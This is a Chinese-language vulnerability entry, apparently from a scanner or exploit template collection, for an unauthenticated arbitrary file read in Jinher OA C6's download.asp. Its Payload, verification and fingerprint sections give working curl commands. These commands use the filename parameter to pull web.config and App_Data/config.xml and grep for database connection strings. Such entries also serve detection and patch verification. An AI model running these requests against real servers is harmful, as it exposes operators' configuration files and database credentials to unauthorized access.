---
id: JINHER-FILE-READ
title: 金和OA C6 download.asp 任意文件读取漏洞
product: jinher-oa
vendor: 金和软件
version_affected: "金和OA C6"
severity: HIGH
tags: [file_read, path_traversal, 无需认证, 国产, oa]
fingerprint: ["金和OA", "Jinher"]
---

## 漏洞描述

金和OA C6 的 download.asp 文件存在任意文件读取漏洞，filename 参数接受任意路径作为输入，攻击者无需认证即可通过路径穿越读取服务器上的 web.config 等敏感配置文件。

## 影响版本

- 金和OA C6

## 前置条件

- 无需认证
- 目标运行金和OA C6

## 利用步骤

1. 确认目标为金和OA
2. 通过 download.asp 的 filename 参数读取文件
3. 下载 web.config 获取数据库连接信息

## Payload

```bash
# 读取 web.config
curl -s "http://target/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"

# 尝试其他路径
curl -s "http://target/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/App_Data/config.xml"
```

## 验证方法

```bash
curl -s "http://target/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config" | grep -i "connectionString\|appSettings\|configuration"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "金和\|Jinher"
curl -s "http://target/C6/" -o /dev/null -w "%{http_code}"
```
